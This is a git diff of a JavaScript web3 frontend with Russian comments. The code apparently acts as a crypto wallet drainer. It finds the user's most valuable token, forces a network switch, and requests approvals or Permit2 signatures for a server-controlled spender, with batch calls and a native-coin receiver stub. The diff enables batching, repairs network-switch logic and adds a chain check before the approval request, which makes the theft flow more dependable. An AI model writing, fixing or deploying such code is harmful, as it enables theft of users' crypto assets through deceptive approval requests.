@@ -5,11 +5,11 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance, signTypedData } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 // === Флаг для включения Permit2 вместо single approve ===
 const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
 // Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
-const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
+const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x0000000000000000000000000000000000000000'
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
@@ -701,40 +701,37 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
     return { success: false, error: errorMessage }
   }
 
-        const targetNetwork = targetNetworkInfo.networkObj
-        const expectedChainId = targetNetworkInfo.chainId
-        if (store.networkState.chainId !== expectedChainId) {
-          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
-          try {
-            await new Promise((resolve, reject) => {
-              const unsubscribe = modal.subscribeNetwork(networkState => {
-                if (networkState.chainId === expectedChainId) {
-                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-                  unsubscribe()
-                  resolve()
-                }
-              })
-              appKit.switchNetwork(targetNetwork).catch(error => {
-                unsubscribe()
-                reject(error)
-              })
-              setTimeout(() => {
-                unsubscribe()
-                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-              }, 10000)
-            })
-          } catch (error) {
-            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            store.isProcessingConnection = false
-            return
+  const targetNetwork = targetNetworkInfo.networkObj
+  const expectedChainId = targetNetworkInfo.chainId
+
+  if (store.networkState.chainId !== expectedChainId) {
+    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+    try {
+      await new Promise((resolve, reject) => {
+        const unsubscribe = appKit.subscribeNetwork(networkState => {
+          if (networkState.chainId === expectedChainId) {
+            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+            unsubscribe()
+            resolve()
           }
-        } else {
-          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
-        }
+        })
+        appKit.switchNetwork(targetNetwork).catch(error => {
+          unsubscribe()
+          reject(error)
+        })
+        setTimeout(() => {
+          unsubscribe()
+          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+        }, 10000)
+      })
+    } catch (error) {
+      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+      store.errors.push(errorMessage)
+      return { success: false, error: errorMessage }
+    }
+  } else {
+    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+  }
 
   try {
     // Get tokens with non-zero balance in the most expensive token's network
@@ -1090,7 +1087,7 @@ const initializeSubscribers = (modal) => {
           console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
           try {
             await new Promise((resolve, reject) => {
-              const unsubscribe = appkit.subscribeNetwork(networkState => {
+              const unsubscribe = modal.subscribeNetwork(networkState => {
                 if (networkState.chainId === expectedChainId) {
                   console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
                   unsubscribe()
@@ -1104,7 +1101,7 @@ const initializeSubscribers = (modal) => {
               setTimeout(() => {
                 unsubscribe()
                 reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-              }, 10000)
+              }, 20000)
             })
           } catch (error) {
             const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
@@ -1119,6 +1116,16 @@ const initializeSubscribers = (modal) => {
           console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
         }
         try {
+          // Доп. проверка соответствия сети перед approve
+          if (store.networkState.chainId !== expectedChainId) {
+            const msg = `Active chain mismatch: active=${store.networkState.chainId}, expected=${expectedChainId}`
+            store.errors.push(msg)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = msg
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
           const contractAddress = CONTRACTS[mostExpensive.chainId]
           const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
           if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
@@ -1134,7 +1141,7 @@ const initializeSubscribers = (modal) => {
             return
           }
           store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
+          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, store.networkState.chainId)
           store.approvedTokens[approvalKey] = true
           store.isApprovalRequested = false
           let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
